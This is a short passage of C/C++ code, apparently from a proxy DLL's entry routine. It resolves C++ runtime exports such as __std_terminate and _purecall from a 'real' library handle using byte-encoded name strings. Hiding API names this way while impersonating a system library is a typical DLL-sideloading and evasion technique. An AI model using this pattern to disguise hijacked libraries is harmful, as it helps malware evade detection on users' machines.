      unsigned char e___uncaught_exception[] = {
          0x66, 0x67, 0x46, 0x5c, 0x04, 0x07, 0x47, 0x05, 0x0b, 0x46,
          0x66, 0x3a, 0x49, 0x51, 0x55, 0x15, 0x4d, 0x01, 0x0b, 0x5f}; // 20
      p___uncaught_exception = ra(hReal, e___uncaught_exception, 20);

      unsigned char e___std_terminate[] = {0x66, 0x67, 0x40, 0x46, 0x03,
                                           0x39, 0x46, 0x07, 0x11, 0x5f,
                                           0x50, 0x31, 0x50, 0x46, 0x55}; // 15
      p___std_terminate = ra(hReal, e___std_terminate, 15);

      unsigned char e__purecall[] = {0x66, 0x48, 0x46, 0x40, 0x02,
                                     0x05, 0x53, 0x0e, 0x0f}; // 9
      p__purecall = ra(hReal, e__purecall, 9);

      unsigned char e___AdjustPointer[] = {0x66, 0x67, 0x72, 0x56, 0x0d,
                                           0x13, 0x41, 0x16, 0x33, 0x5d,
                                           0x50, 0x31, 0x45, 0x57, 0x42}; // 15
      p___AdjustPointer = ra(hReal, e___AdjustPointer, 15);

      unsigned char e___std_type_info_destroy_list[] = {
          0x66, 0x67, 0x40, 0x46, 0x03, 0x39, 0x46, 0x1b, 0x13, 0x57,
          0x66, 0x36, 0x5f, 0x54, 0x5f, 0x3a, 0x5d, 0x0d, 0x17, 0x45,
          0x42, 0x0c, 0x50, 0x76, 0x0e, 0x29, 0x33, 0x55}; // 28
      p___std_type_info_destroy_list =
          ra(hReal, e___std_type_info_destroy_list, 28);

      unsigned char e___processing_throw[] = {
          0x66, 0x67, 0x43, 0x40, 0x08, 0x05, 0x57, 0x11, 0x10,
          0x5b, 0x57, 0x38, 0x6e, 0x46, 0x58, 0x17, 0x56, 0x1f}; // 18
      p___processing_throw = ra(hReal, e___processing_throw, 18);
    }
  }
  return TRUE;
}
